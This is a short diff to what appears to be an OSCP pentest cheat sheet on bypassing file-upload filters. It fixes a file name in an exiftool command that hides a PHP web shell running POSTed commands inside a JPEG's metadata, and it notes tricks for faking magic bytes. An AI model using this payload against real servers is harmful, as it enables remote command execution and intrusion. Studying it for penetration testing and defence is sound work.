@@ -58,7 +58,7 @@ Only refer Extensions section below for OSCP File upload Bypassing
 2. Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata:
 
 ```
- exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpgv
+ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
 - It is also possible that the **magic bytes** are just being **checked** in the file and you could set them **anywhere in the file**.
 
